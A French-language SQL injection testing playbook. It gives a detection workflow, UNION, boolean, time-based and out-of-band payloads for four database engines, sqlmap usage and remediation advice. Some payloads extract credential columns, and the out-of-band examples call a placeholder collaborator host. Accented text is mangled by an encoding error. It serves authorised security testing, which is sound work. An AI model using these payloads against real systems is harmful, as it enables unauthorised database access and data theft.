````markdown
# ğŸš€ SQL Injection Playbook â€” Workflow Professionnel

> âš ï¸ **Ã€ utiliser uniquement avec autorisation Ã©crite** (pÃ©rimÃ¨tre dÃ©fini & consenti).  
> RÃ©fÃ©rences : [**PortSwigger Web Security Academy**][1] (dÃ©tection, UNION, blind, OAST) et [**OWASP WSTG**][2] (mÃ©thodologie de test).

---

## ğŸ”§ 0) PrÃ©paration

- **Proxy & outils** : Burp Suite (Logger++, Repeater, Intruder), `ffuf`, `feroxbuster`, `sqlmap`.
- **Cartographie** : endpoints & paramÃ¨tres (GET, POST, JSON, headers/cookies).
- **RÃ¨gle dâ€™or** : privilÃ©gier des payloads **non destructifs** âœ….

---

## ğŸ•µï¸ 1) DÃ©tection rapide (in-band vs blind)

### ğŸ”¹ 1.1 Sonde minimale

Injecter `'` ou `"` et observer :

```diff
+ Erreur SQL visible â†’ SQLi in-band probable (error/UNION).
! Pas dâ€™erreur mais contenu diffÃ©rent â†’ Blind boolean.
- Aucun Ã©cart â†’ tester Time-based ou OAST.
````

*(cf. [PortSwigger Blind SQLi][3])*

### ğŸ”¹ 1.2 Commentaires & fermetures (selon SGBD)

* **MySQL** : `-- ` (avec espace), `#`, `/* â€¦ */`
* **PostgreSQL / SQL Server / Oracle** : `--`, `/* â€¦ */`

---

## ğŸ¯ 2) SQLi in-band (Error-based & UNION)

### 2.1 Error-based

Exemples dâ€™empreintes (fingerprinting) :

```sql
-- MySQL
?id=1 AND @@version--

-- PostgreSQL
?id=1 UNION SELECT current_database()--

-- SQL Server
?id=1 UNION SELECT @@version--

-- Oracle
?id=1 UNION SELECT banner FROM v$version--
```

> ğŸ’¡ Si aucune erreur affichÃ©e â†’ passer Ã  **UNION** ou **blind**.

---

### 2.2 UNION query â€” procÃ©dure canonique

**1. Trouver nb colonnes**

```sql
?id=1 ORDER BY 1--
?id=1 ORDER BY 2--
...
```

ou

```sql
?id=1 UNION SELECT NULL--
?id=1 UNION SELECT NULL,NULL--
```

**2. Colonnes affichÃ©es (texte)**

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

**3. EnumÃ©rer**

* Version : `version()`, `@@version`, `current_database()`, `banner ...`
* Tables : `information_schema.tables` ou vues Oracle (`all_tables`)
* Colonnes : `information_schema.columns`
* DonnÃ©es : `UNION SELECT username,password FROM users--`

âœ… **Checklist In-band**

* [ ] Nb colonnes trouvÃ©
* [ ] Colonne(s) texte identifiÃ©e(s)
* [ ] Version & DB courante extraite
* [ ] Tables/colonnes listÃ©es
* [ ] PoC avec donnÃ©es non sensibles

---

## ğŸ•³ï¸ 3) SQLi Blind (aucune sortie exploitable)

> **StratÃ©gie** : â‘  Boolean-based (rÃ©ponse change) â†’ â‘¡ Time-based (latence) â†’ â‘¢ OAST (DNS/HTTP externe).
> (cf. [PortSwigger Blind SQLi][3])

---

### 3.1 Boolean-based

```sql
?id=1 AND 1=1--
?id=1 AND 1=2--
```

Exfiltration caractÃ¨re par caractÃ¨re (MySQL exemple) :

```sql
?id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>77--
```

---

### 3.2 Time-based

Utiliser fonctions de dÃ©lai pour tester vrai/faux :

```sql
-- MySQL
?id=1 AND IF(ASCII(SUBSTRING(version(),1,1))>77,SLEEP(5),0)--

-- PostgreSQL
?id=1 AND CASE WHEN (ASCII(SUBSTRING(current_database(),1,1))>77) THEN pg_sleep(5) ELSE '' END--

-- SQL Server
?id=1 AND IF(ASCII(SUBSTRING(DB_NAME(),1,1))>77, WAITFOR DELAY '0:0:5',0)--

-- Oracle
?id=1 AND CASE WHEN ASCII(SUBSTR((SELECT ora_database_name FROM dual),1,1))>77 THEN dbms_pipe.receive_message('a',5) END--
```

---

### 3.3 Out-of-Band (OAST)

DÃ©clencher une requÃªte externe (Burp Collaborator, DNS/HTTP) :

```sql
-- SQL Server
; EXEC master..xp_dirtree '\\<collab-id>\a'--

-- Oracle
UTL_HTTP.REQUEST('http://<collab-id>')

-- MySQL (Windows)
LOAD_FILE('\\\\<collab-id>\\a')
```

âœ… **Checklist Blind**

* [ ] Point dâ€™injection confirmÃ©
* [ ] MÃ©thode choisie (Boolean / Time / OAST)
* [ ] Extraction version/DB validÃ©e
* [ ] Script dâ€™automatisation prÃªt

---

## ğŸŒ³ 4) Arbre de dÃ©cision (rÃ©sumÃ©)

```diff
? Erreur SQL visible ?
+ Oui â†’ Error/UNION â†’ Nb colonnes â†’ EnumÃ©ration
! Non â†’ Contenu change ?
+ Oui â†’ Blind Boolean (dichotomie)
! Non â†’ Latence mesurable ?
+ Oui â†’ Blind Time (SLEEP / WAITFOR / pg_sleep)
- Non â†’ OAST (Burp Collaborator / DNS)
```

---

## ğŸ“Š 5) Payloads de base par SGBD

| Objectif    | MySQL        | PostgreSQL           | SQL Server              | Oracle                        |
| ----------- | ------------ | -------------------- | ----------------------- | ----------------------------- |
| Version     | `version()`  | `version()`          | `@@version`             | `banner FROM v$version`       |
| DB courante | `database()` | `current_database()` | `DB_NAME()`             | `ora_database_name FROM dual` |
| Time delay  | `SLEEP(5)`   | `pg_sleep(5)`        | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message`   |

---

## ğŸ¤– 6) Automatisation avec sqlmap

```bash
sqlmap -u "https://target/item.php?id=1" -p id \
  --risk=2 --level=2 \
  --technique=BEUSTQ \
  --fingerprint
```

* `--technique=BEUSTQ` : Boolean, Error, UNION, Stacked, Time, Query inline
* `--fingerprint` : identification du SGBD/version

> ğŸ’¡ Astuce pro : commence **manuel** (comprendre lâ€™injection), puis utilise **sqlmap** pour automatiser lâ€™Ã©numÃ©ration.

---

## ğŸ“ 7) QualitÃ© du rapport

* **Reproduction** : payload exact + captures Burp.
* **Impact** : quelles donnÃ©es accessibles ? pÃ©rimÃ¨tre ? pivot possible.
* **RemÃ©diations** :

  * RequÃªtes paramÃ©trÃ©es / ORM
  * Principes **Least Privilege**
  * Masquage dâ€™erreurs
  * WAF en dÃ©fense complÃ©mentaire

---

## âœ… 8) Check-list finale â€œPrÃªte Ã  lâ€™emploiâ€

* [ ] Cartographie params (GET, POST, cookies, JSON body)
* [ ] Tests `'` + commentaires
* [ ] In-band : ORDER BY / UNION NULL â†’ nb colonnes â†’ colonne affichÃ©e
* [ ] Blind : boolean â†’ time â†’ OAST
* [ ] Fingerprint SGBD + version
* [ ] PoC non destructif + preuves
* [ ] Rapport clair + remÃ©diations

---

### ğŸ“š Annexes

* [PortSwigger SQLi Labs][1]
* [OWASP WSTG SQLi Testing][2]

---

[1]: https://portswigger.net/web-security/sql-injection
[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
[3]: https://portswigger.net/web-security/sql-injection/blind

```

---

```
